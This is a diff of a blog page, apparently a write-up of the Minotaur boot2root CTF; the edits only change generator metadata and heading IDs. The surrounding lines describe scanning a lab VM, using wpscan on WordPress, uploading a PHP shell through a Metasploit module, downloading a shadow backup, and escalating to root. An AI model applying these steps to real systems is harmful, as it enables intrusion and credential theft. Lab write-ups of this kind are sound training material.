@@ -5,7 +5,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.15" />
+<meta name="generator" content="Hugo 0.18.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="https://rastamouse.me/css/style.css" type="text/css">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
@@ -52,20 +52,20 @@
   </div>
   <h1 class="headline" itemprop="headline">BNE0x00 - Minotaur</h1>
   <section class="body" itemprop="articleBody">
-    
-
-<h3 id="minotaur-ctf:130852a9ee39e601e939903b24e77be6">Minotaur CTF</h3>
+    <h3 id="minotaur-ctf">Minotaur CTF</h3>
 
 <p>Minotaur is a boot2root CTF. There are a few flag.txt files around to grab. /root/flag.txt is your ultimate goal.</p>
 
-<h3 id="hints:130852a9ee39e601e939903b24e77be6">Hints</h3>
+<h3 id="hints">Hints</h3>
 
 <ul>
 <li>This CTF has a couple of fairly heavy password cracking challenges, and some red herrings.</li>
 <li>One password you will need is not on rockyou.txt or any other wordlist you may have out there. So you need to think of a way to generate it yourself.</li>
 </ul>
 
-<h2 id="enumeration:130852a9ee39e601e939903b24e77be6">Enumeration</h2>
+<p></p>
+
+<h2 id="enumeration">Enumeration</h2>
 
 <p>After spinning up the VM and doing an ARP scan, we find it at <code>192.168.56.223</code>.  A port scan shows 3 ports available:</p>
 
@@ -110,7 +110,7 @@ ID	Response   Lines      Word         Chars          Request
 </figure>
 </div>
 
-<h2 id="wordpress:130852a9ee39e601e939903b24e77be6">Wordpress</h2>
+<h2 id="wordpress">Wordpress</h2>
 
 <p><code>wpscan</code> is my defacto tool for scanning Wordpress.  <code>root@kali:~# wpscan -u http://192.168.56.223/bull/</code></p>
 
@@ -146,7 +146,7 @@ root@kali:~/minotaur# wc -l bulls
 
 <p>I manually logged in just to make sure they worked, and I also noted that this was an admin account (which was fairly predictable due to its ID).  But it does mean that we don&rsquo;t actually need to exploit the Slideshow Gallery vulnerability, as we can just upload a PHP Shell via this admin panel.</p>
 
-<h2 id="shell:130852a9ee39e601e939903b24e77be6">Shell</h2>
+<h2 id="shell">Shell</h2>
 
 <p>I&rsquo;ll just use the <code>exploit/unix/webapp/wp_admin_shell_upload</code> Metasploit module for this.</p>
 
@@ -169,7 +169,7 @@ OS          : Linux minotaur 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15
 Meterpreter : php/php
 </code></pre>
 
-<h2 id="flag-1:130852a9ee39e601e939903b24e77be6">Flag 1</h2>
+<h2 id="flag-1">Flag 1</h2>
 
 <p>The VM description told us that there are multiple flags, the first of which is found in the webroot.</p>
 
@@ -178,7 +178,7 @@ Oh, lookey here. A flag!
 Th15 15 @N 3@5y f1@G!
 </code></pre>
 
-<h2 id="flag-2:130852a9ee39e601e939903b24e77be6">Flag 2</h2>
+<h2 id="flag-2">Flag 2</h2>
 
 <p>The second flag is found in the <code>/tmp</code> directory, along with a priv-esc opportunity.</p>
 
@@ -193,7 +193,7 @@ Also, you found a flag!
 My m1L|&lt;$|-|@|&lt;3 br1|\|G$ @11 t3h b0y$ 2 t3h y@R|)
 </code></pre>
 
-<h2 id="root:130852a9ee39e601e939903b24e77be6">root</h2>
+<h2 id="root">root</h2>
 
 <pre><code class="language-text">meterpreter &gt; download /tmp/shadow.bak
 [*] downloading: /tmp/shadow.bak -&gt; shadow.bak
@@ -255,7 +255,7 @@ minotaur@minotaur:~$ sudo -i
 root@minotaur:~# 
 </code></pre>
 
-<h2 id="final-flag:130852a9ee39e601e939903b24e77be6">Final Flag</h2>
+<h2 id="final-flag">Final Flag</h2>
 
 <pre><code class="language-text">root@minotaur:~# ls -l
 -rw------- 1 root root   70 May 27  2015 flag.txt
@@ -266,7 +266,6 @@ root@minotaur:~# cat flag.txt
 Congrats! You got the final flag!
 Th3 Fl@g is: 5urr0nd3d bY @r$3h0l35
 </code></pre>
-
   </section>
 </article>
 
